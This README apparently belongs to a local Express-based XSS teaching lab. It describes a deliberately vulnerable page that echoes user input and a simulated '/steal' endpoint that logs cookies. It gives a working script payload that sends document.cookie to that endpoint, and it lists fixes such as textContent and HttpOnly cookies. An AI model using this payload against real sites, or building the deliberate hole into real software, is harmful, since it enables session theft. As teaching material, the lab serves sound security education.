# XSS Local Lab (Educational)

**Warning:** This repository is for educational, local-only use. Do NOT deploy to public servers or use against systems you do not own.

## What it contains
- `server.js` - Express server that serves:
  - `/vulnerable` - a deliberately vulnerable page that sets a non-HttpOnly cookie and echoes user input unsafely.
  - `/steal` - a simulated attacker endpoint that logs received cookie data to `received_log.txt`.
- `package.json` - Node project file.
- `.gitignore` - ignores node_modules and the log file.

## Quick start (run locally)
1. Install Node.js (LTS).
2. Open terminal in this folder.
3. Run:
   ```bash
   npm install
   npm start
   ```
4. Open `http://localhost:3000/vulnerable` in your browser.
5. Try posting:
   ```html
   <script>fetch('/steal?cookie='+encodeURIComponent(document.cookie))</script>
   ```
   Then check your terminal or `received_log.txt` for the simulated exfiltrated cookie.

## Cleanup
- Stop server with Ctrl+C.
- Remove `received_log.txt` if desired.

## Learning goals
- Observe how XSS can execute injected JS.
- See difference between `alert()` (local) and `fetch()` (exfiltration).
- Practice fixing the vulnerability by replacing `innerHTML` with safe `textContent` and setting `HttpOnly` cookies on the server side.
